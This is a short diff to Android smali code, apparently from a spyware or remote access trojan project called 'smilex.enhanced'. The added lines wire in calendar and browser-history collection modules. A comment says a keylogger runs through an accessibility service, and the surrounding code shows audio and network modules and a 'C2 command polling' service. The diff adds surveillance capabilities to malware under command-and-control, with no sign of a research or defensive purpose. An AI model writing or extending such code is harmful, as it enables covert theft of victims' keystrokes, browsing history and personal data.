@@ -37,6 +37,11 @@
     invoke-static {p0}, Lcom/smilex/enhanced/modules/AudioModule;->init(Landroid/content/Context;)V
     invoke-static {p0}, Lcom/smilex/enhanced/modules/NetworkModule;->init(Landroid/content/Context;)V
 
+    # Initialize hwapp391-ported modules: Calendar, Browser History, Keylogger
+    invoke-static {p0}, Lcom/smilex/enhanced/modules/CalendarModule;->init(Landroid/content/Context;)V
+    invoke-static {p0}, Lcom/smilex/enhanced/modules/BrowserHistoryModule;->init(Landroid/content/Context;)V
+    # KeyloggerModule is activated by AccessibilityMonitorService — no separate init needed
+
     # Start C2 command polling
     new-instance v0, Landroid/content/Intent;
     const-class v1, Lcom/smilex/enhanced/services/C2CommandPoller;
